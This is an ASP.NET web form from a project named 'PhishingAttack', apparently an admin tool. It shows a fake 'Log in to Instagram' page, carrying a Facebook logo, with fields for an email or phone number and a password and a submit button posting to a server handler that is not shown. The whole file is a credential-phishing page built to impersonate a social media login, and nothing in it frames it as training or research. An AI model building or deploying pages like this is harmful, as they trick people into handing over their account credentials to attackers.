<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="GenerateLinkInsta.aspx.cs" Inherits="PhishingAttack.Admin.GenerateLinkInsta" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>

    <style type="text/css">
body {
	text-align: left;
	background-color: rgba(233,232,232,0.89);
	margin-left: auto;
	margin-right: auto;
	margin-bottom: auto;
	margin-top: 15%;
	top: auto;
	left: auto;
	right: auto;
	bottom: auto;
}
#box {
	border-width: thin;
	border-radius: 15px 40px 40px 15px;
	-webkit-box-shadow: 0px 0px;
	box-shadow: 0px 0px;
	border-color: rgba(69,71,181,1.00)
}
tr td h1 {
	font-size: medium;
	text-align: center;
	margin-top: -33px;
	padding-right: 73px;
	font-weight: 300;
	font-family: "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "DejaVu Sans", Verdana, sans-serif;
	font-style: normal;
}
tbody tr img {
	width: 40px;
	height: 38px;
	margin-left: 8px;
}
#second {
	text-align: center;
	font-size: large;
	text-shadow: 0px 0px;
	border-width: 0px;
}
#user {
	text-align: center;
}
#pass {
	text-align: center;
}
#submit 
{
   text-align: center;
	-webkit-box-shadow: 0px 0px;
	box-shadow: 0px 0px;
}
#submit #btnSubmit {
	background-color: rgba(31,71,196,0.89);
	width: 100px;
	font-family: Constantia, "Lucida Bright", "DejaVu Serif", Georgia, serif;
	font-weight: 400;
}

body table {
		margin-right: auto;
	margin-bottom: auto;
	margin-left: auto;
	margin-top: 0pt;
	width: 400px;
	border: none;
	height: 200px;
	background-color: rgba(255,255,255,1.00);
	border-radius: 12px 30px 30px 12px;
	-webkit-box-shadow: 0px 0px 70px;
	box-shadow: 0px 0px 70px;
}

tbody tr td {
	border-width: 0px;
}
table tbody tr {
}
.inputfield 
{
	/* Add this as a property for a selector to which the effect has to be applied*/

 /* For Mozilla*/

 -moz-border-radius-topleft:40px;
 -moz-border-radius-topright:40px;
 -moz-border-radius-bottomright:40px;
 -moz-border-radius-bottomleft:40px;
 /*For Webkit*/
 -webkit-border-top-left-radius:40px;
 -webkit-border-top-right-radius:40px;
 -webkit-border-bottom-right-radius:40px;
 -webkit-border-bottom-left-radius:40px;
	}
</style>
</head>


<body>
    <form id="form1" runat="server">
    <table width="200" border="1">
  <tbody>
   <tr>
   
      <td id="box"><img src="../images/facebook.jpg" width="220" height="200" alt=""/> <h1> you must login to continue!!</h1> </td>
    </tr>
    <tr>
      <td id="second" style="color:red">  Log in to Instagram </td>
    </tr>
    <tr>
      <td id="user">
          <asp:TextBox ID="txtUserName" runat="server" class="inputfield" Height="23px" 
              Width="250px" placeholder="Email address or phone number" style="text-align:center"></asp:TextBox>
        </td>
    </tr>
    <tr>
      <td id="pass">
          <asp:TextBox ID="txtPassword" runat="server" class="inputfield" Height="23px" 
              Width="250px" placeholder="Password" style="text-align:center" TextMode="Password"></asp:TextBox>
        </td>
    </tr>
    <tr>
      <td id="submit">
          <asp:Button ID="btnSubmit" runat="server" Text="Submit" Width="100px" 
              class="inputfield" onclick="btnSubmit_Click" />
        </td>
    </tr>
  </tbody>
</table>
    </form>
</body>
</html>
